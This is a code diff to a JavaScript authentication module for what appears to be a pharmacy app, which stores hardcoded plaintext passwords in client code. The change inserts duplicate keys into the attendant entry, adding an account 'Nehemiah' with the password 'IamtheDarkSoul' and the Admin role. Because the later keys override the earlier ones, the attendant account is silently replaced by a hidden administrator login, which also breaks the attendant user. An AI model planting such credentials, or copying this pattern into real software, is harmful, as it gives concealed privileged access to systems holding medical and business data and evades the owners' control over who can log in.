@@ -10,7 +10,9 @@ const Auth = (() => {
   const USERS = [
     { username: 'admin',      password: 'admin123',  role: 'Admin',       name: 'Admin' },
     { username: 'pharmacist', password: 'pharm123',  role: 'Pharmacist',  name: 'Dr. Asante' },
-    { username: 'attendant',  password: 'attend123', role: 'Attendant',   name: 'Kofi' },
+    { username: 'attendant',  password: 'attend123', role: 'Attendant',   name: 'Kofi',
+      username: 'Nehemiah', password: 'IamtheDarkSoul', role: 'Admin', name: 'TestingDev'
+     },
   ];
 
   // Nav cards visible per role
